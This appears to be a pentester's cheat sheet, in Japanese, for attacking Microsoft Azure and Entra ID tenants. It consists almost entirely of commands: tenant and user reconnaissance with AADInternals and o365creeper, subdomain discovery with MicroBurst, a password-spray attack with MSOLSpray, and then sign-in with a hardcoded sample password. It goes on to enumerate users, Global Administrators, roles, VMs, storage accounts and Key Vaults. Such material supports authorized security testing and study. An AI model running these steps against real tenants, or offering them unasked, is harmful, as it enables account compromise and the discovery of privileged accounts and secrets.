# AzureCloud-EntraID

### ユーザ名（プリンシパル名・メールアドレス）からのテナント情報の取得
```
# AADInternals

> Get-AADIntLoginInformation -UserName admin@microsoft.onmicrosoft.com
```

### ドメインからのテナントIDの取得
```
# AADInternals

> Get-AADIntTenantID -Domain microsoft.onmicrosoft.com
```

### Entra IDとして機能するメールアドレスの特定
```
# o365creeper
# C:\temp\users.txt : ユーザ名のリスト

> C:\Python27\python.exe .\o365creeper.py -f C:\temp\users.txt -o C:\temp\validusers.txt
```

### ベース文字列からのサブドメイン検索
```
# MicroBurst

> Invoke-EnumerateAzureSubDomains -Base microsoft -Verbose
```

### パスワードスプレー攻撃
```
# MSOLSpray
# C:\temp\validemails.txt : ユーザ名のリスト

> Invoke-MSOLSpray -UserList C:\temp\validusers.txt -Password P@ssw0rd -Verbose
```

### AzureADモジュールでのログオン
```
> Install-Module AzureAD -Scope CurrentUser
> Import-Module AzureAD
> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzureAD -Credential $creds
```

### 全ユーザの列挙
```
> Get-AzureADUser -All $true
> Get-AzureADUser -All $true | select UserPrincipalName
```

### 全グループの列挙
```
> Get-AzureADGroup -All $true
```

### 全デバイスの列挙
```
> Get-AzureADDevice
```

### グローバル管理者ロールの付与されたユーザの列挙
```
> Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```

### AzureADPreviewモジュールでのログオン
```
> Install-Module AzureADPreview -Scope CurrentUser
> Import-Module AzureADPreview
> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzureAD -Credential $creds
```

### カスタムロールの列挙
```
#AzureADPreviewモジュールで実行

> Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

### Azモジュールでのログオン
```
> Install-Module Az -scope CurrentUser

> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzAccount -Credential $creds
```

### ログオン中のユーザでアクセス可能なAzureリソースを列挙
```
> Get-AzResource
```

### ログオン中のユーザに付与されているAzureリソースに対するロールを列挙
```
> Get-AzRoleAssignment -SignInName test@contoso.onmicrosoft.com
```

### ログオン中のユーザでアクセス可能なVirtualMachineを列挙
```
> Get-AzVM | fl
```

### ログオン中のユーザでアクセス可能なApp Servicesを列挙
```
 > Get-AzWebApp
 > Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
```

### ログオン中のユーザでアクセス可能なAzure Functionsを列挙
```
 > Get-AzFunctionApp
```

### ログオン中のユーザでアクセス可能なストレージアカウントを列挙
```
> Get-AzStorageAccount | fl
```

### ログオン中のユーザでアクセス可能なKey Vaultを列挙
```
> Get-AzKeyVault
```
